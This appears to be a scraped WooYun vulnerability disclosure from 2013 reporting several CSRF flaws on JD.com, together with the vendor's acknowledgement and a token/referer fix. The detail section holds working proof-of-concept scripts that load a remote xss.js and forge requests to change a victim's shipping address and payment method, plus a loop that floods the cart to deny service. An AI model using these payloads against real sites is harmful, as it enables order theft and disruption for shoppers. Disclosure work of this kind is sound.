{"id": 11500, "wybug_id": "wooyun-2013-024771", "wybug_title": "京东商城多处敏感操作缺乏验证", "wybug_corp": "京东商城", "wybug_author": "过客", "wybug_date": "2013-05-30 10:51", "wybug_open_date": "2013-07-14 10:52", "wybug_type": "CSRF", "wybug_level": "低", "wybug_rank_0": "15", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["利用"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2013-05-30：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2013-05-30：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2013-06-09：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2013-06-19：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2013-06-29：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2013-07-14：\t细节向公众公开  简要描述： 多处 CSRF，能修改的内容很多 详细说明：  1. 修改收货地址，帐户中只有一个收货地址时，很多人付款时不注意收货地址，直接付款\n<script src= http://mmme.me/xss.js></script>xss.ajax('http://trade.jd.com/consignee/saveConsignee.action',\"consigneeParam.id=0&consigneeParam.type=1&consigneeParam.name=xxxkkk&consigneeParam.provinceId=15&consigneeParam.cityId=1158&consigneeParam.countyId=3413&consigneeParam.townId=46422&consigneeParam.address=bbbbbbbbbbbb&consigneeParam.mobile=13100000000&consigneeParam.email=&consigneeParam.phone=&consigneeParam.provinceName=浙江&consigneeParam.cityName=宁波市&consigneeParam.countyName=江东区&consigneeParam.townName=白鹤街道&consigneeParam.commonConsigneeSize=1&consigneeParam.isUpdateCommonAddress=1\")</script>\n效果如下\n\n2. 修改支付方式，这个没多大影响修改支付方式为 货到付款，工作日、双休日与假日均可送货\n<script src= http://mmme.me/xss.js></script>xss.ajax('http://trade.jd.com/payAndShip/savePayAndShip.action', 'saveParam.paymentId=1&saveParam.jdShipmentType=65&saveParam.jdShipTime=3&saveParam.jdBeforeNotify=0&saveParam.jdPayWayId=1')</script>\n3. 购物车 CSRF 拒绝服务，CSRF 填满购物车，正常购物流程无法进行\n(ddos = function() {  var i;  for (i = 530000; i <= 532000; i++) {    xss.csrf('http://gate.jd.com/InitCart.aspx?pcount=100000000&ptype=1&pid=' + i);  }}).call(this);\n效果如下，\n\n正常购物再无法加入购物车\n\n   漏洞证明：  如上   修复方案：  表单加 token 或验证 referer   版权声明：转载请注明来源 过客@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：中 漏洞Rank：8  确认时间：2013-05-30 11:19 厂商回复： 非常感谢您对京东的关注！ 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n  \n\n\n", "wybug_level_fromcorp": "中", "wybug_rank_fromcorp": 8, "Ranks": null}